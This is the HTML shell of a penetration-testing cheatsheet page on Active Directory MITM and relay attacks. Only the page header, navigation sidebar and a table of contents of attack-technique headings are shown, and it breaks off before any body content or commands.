
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://hktalent.github.io/InternalAllTheThings/active-directory/internal-mitm-relay/">
      
      
        <link rel="prev" href="../internal-dcom/">
      
      
        <link rel="next" href="../internal-pxe-boot-image/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.3">
    
    
      
        <title>Internal - MITM and Relay - Internal All The Things</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.50c56a3b.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="Internal - MITM and Relay - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/active-directory/internal-mitm-relay.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://hktalent.github.io/InternalAllTheThings/active-directory/internal-mitm-relay/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="Internal - MITM and Relay - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://hktalent.github.io/InternalAllTheThings/assets/images/social/active-directory/internal-mitm-relay.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#internal-mitm-and-relay" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Internal - MITM and Relay
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/hktalent/InternalAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal All The Things
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adcs-certificate-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-acl-ace/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-enumerate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-groups/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Groups
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adds-rodc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-adfs-federation-services/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-integrated-dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-asrep/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-roasting-timeroasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ad-tricks/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory - Tricks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../deployment-sccm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - SCCM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../deployment-wsus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Deployment - WSUS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-capture/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-over-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hash-pass-the-hash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hash - Pass-the-Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-dcom/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - DCOM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Internal - MITM and Relay
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Internal - MITM and Relay
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ms08-068-ntlm-reflection" class="md-nav__link">
    <span class="md-ellipsis">
      MS08-068 NTLM reflection
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ldap-signing-not-required-and-ldap-channel-binding-disabled" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP signing not required and LDAP channel binding disabled
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv4" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Signing Disabled and IPv4
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#smb-signing-disabled-and-ipv6" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Signing Disabled and IPv6
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#drop-the-mic" class="md-nav__link">
    <span class="md-ellipsis">
      Drop the MIC
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ghost-potato-cve-2019-1384" class="md-nav__link">
    <span class="md-ellipsis">
      Ghost Potato - CVE-2019-1384
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remotepotato0-dcom-dce-rpc-relay" class="md-nav__link">
    <span class="md-ellipsis">
      RemotePotato0 DCOM DCE RPC relay
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dns-poisonning-relay-delegation-with-mitm6" class="md-nav__link">
    <span class="md-ellipsis">
      DNS Poisonning - Relay delegation with mitm6
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#relaying-with-webdav-trick" class="md-nav__link">
    <span class="md-ellipsis">
      Relaying with WebDav Trick
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#man-in-the-middle-rdp-connections-with-pyrdp-mitm" class="md-nav__link">
    <span class="md-ellipsis">
      Man-in-the-middle RDP connections with pyrdp-mitm
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-pxe-boot-image/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../internal-shares/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Internal - Shares
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-bronze-bit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-constrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-s4u/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kerberos-tickets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos - Tickets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-comments/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - AD User Comment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-dsrm-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - DSRM Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-group-policy-preferences/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Group Policy Preferences
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-precreated-computer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Pre-Created Computer Account
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-read-gmsa/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - GMSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-read-laps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - LAPS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-shadow-credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Shadow Credentials
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../pwd-spraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password - Spraying
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-pam/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Privileged Access Management
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-relationship/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trust - Relationship
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-sid-hijacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Child Domain to Forest Compromise - SID Hijacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../trust-ticket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forest to Forest Compromise - Trust Ticket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_42" >
        
          
          <label class="md-nav__link" for="__nav_2_42" id="__nav_2_42_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CVE
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_42_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_42">
            <span class="md-nav__icon md-icon"></span>
            CVE
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/MS14-068/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MS14-068 Checksum Validation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/NoPAC/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NoPAC / samAccountName Spoofing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/PrintNightmare/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintNightmare
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/PrivExchange/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrivExchange
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CVE/ZeroLogon/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ZeroLogon
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        
